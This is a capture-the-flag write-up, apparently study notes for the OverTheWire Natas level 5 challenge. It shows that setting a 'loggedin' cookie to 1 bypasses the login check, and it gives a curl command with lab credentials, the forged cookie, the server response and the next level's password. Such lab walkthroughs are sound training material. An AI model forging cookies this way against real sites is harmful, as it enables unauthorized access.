@@ -1,0 +1,50 @@
+Here are clear notes on Natas Level 5 → Level 6:
+Natas Level 5: Cookie Manipulation
+What You See
+Page displays: "Access disallowed. You are not logged in."
+No buttons, forms, or anything to interact with
+The Key Question
+How does the website know I'm not logged in?
+The Answer: Cookies
+Every HTTP request you send includes cookies — small pieces of data stored by your browser and sent back to the server with each request.
+Finding the Cookie
+Open Developer Tools (Ctrl+Shift+I in Firefox/Chrome)
+Go to Storage (Firefox) or Application (Chrome)
+Click Cookies → natas5.natas.labs.overthewire.org
+Find the cookie named loggedin with value 0
+The Vulnerability
+The server checks this cookie to decide if you're "logged in"
+Value 0 = not logged in
+Value 1 = logged in
+This is client-side access control — the server trusts data the user can freely modify.
+The Exploit
+Change the cookie value from 0 to 1, then refresh the page.
+The server sees loggedin=1 and serves the protected content.
+Why This Is Insecure
+Cookies are stored locally and easily modified
+Authentication decisions should never rely solely on client-controlled data
+Proper systems use server-side sessions with cryptographically secure tokens
+Password for Natas Level 6
+plain
+7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+Key Takeaway
+When you see a "not logged in" message with no login form, check cookies first. Client-side state (cookies, localStorage, URL parameters) is often the weak point.
+ curl -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M \
+     -H "Cookie: loggedin=1" \
+     http://natas5.natas.labs.overthewire.org/
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT</div>
+</body>
+</html>
